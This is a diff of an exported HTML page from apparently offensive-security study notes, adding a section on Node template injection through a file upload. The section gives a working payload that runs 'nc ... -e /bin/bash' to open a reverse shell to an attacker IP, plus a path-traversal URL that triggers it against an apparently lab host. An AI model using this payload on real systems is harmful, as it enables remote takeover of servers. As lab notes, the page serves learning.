@@ -1,11 +1,11 @@
 <!doctype html><html>
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>secnotes.ctb</title>
+  <title>Template-RCE-upload</title>
   <meta name="generator" content="CherryTree">
   <link rel="stylesheet" href="styles.css" type="text/css" />
 </head>
-<body><div class="tree">
+<body><div class="main"><div class="tree">
 <p><strong>Index</strong></p>
 <p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>
 
@@ -50,4 +50,5 @@
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
 </ol></ol></div>
+<div class="page"><h1><b><u>Template-RCE-upload</u></b></h1><br />In node, you cannot upload a file an browse it like we did with PHP files ...<br /><strong><br />We need to use something called drouting</strong><br /><br />/drouting<br /><br /><br />Create a file (- means execute javascript)<br /><br />-var x= global.process.mainModule.require<br />-x('child_process').exec('nc 192.168.43.71 8888 -e /bin/bash')<br /><br /><br />upload the txt file <br /><br /><br /><img src="images/692-1.png" alt="images/692-1.png" /><br /><br /><br />get the filename and the path :<br /><br /><a href="http://chat:3000/drouting?filename=../uploads/fa9af1c0108bbcd0ebf4a5e784db4eb6">http://chat:3000/drouting?filename=../uploads/fa9af1c0108bbcd0ebf4a5e784db4eb6</a><br /><br />and get a shell :<br /><br /><img src="images/692-2.png" alt="images/692-2.png" /><br /><br /><br /></div></div>
 </body></html>
